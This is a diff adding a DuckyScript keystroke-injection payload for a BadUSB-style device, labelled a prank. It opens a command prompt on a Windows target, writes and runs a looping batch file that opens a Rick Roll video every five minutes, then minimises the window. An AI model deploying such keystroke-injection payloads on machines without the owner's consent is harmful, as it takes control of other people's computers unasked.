@@ -1,0 +1,33 @@
+REM Title: Rick Rolling Forever
+REM Author:	UberGuidoZ
+REM Inspired by burnttoast when assisting with a LONG script (pver 2,750 lines!)
+REM
+REM Description: Creates a batch file that opens a Rick Roll every 5 mins in default browser
+REM Notes: Creates batch file, starts batch file, minimizes the window
+REM Target:	Windows but fairly easily modified to work on any OS with a browser
+REM Version:	1.2
+REM Category:	Prank
+REM Source: https://github.com/UberGuidoZ/OMG-Payloads
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 2000
+STRING copy con rr.bat
+ENTER
+STRING @ECHO OFF
+STRING PING 127.0.0.1 -n 5 > NUL
+ENTER
+STRING :LOOP
+ENTER
+STRING start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER
+STRING PING 127.0.0.1 -n 300 > NUL
+ENTER
+STRING GOTO LOOP
+ENTER
+CTRL C
+DELAY 1000
+STRING cls && rr.bat
+GUI DOWNARROW
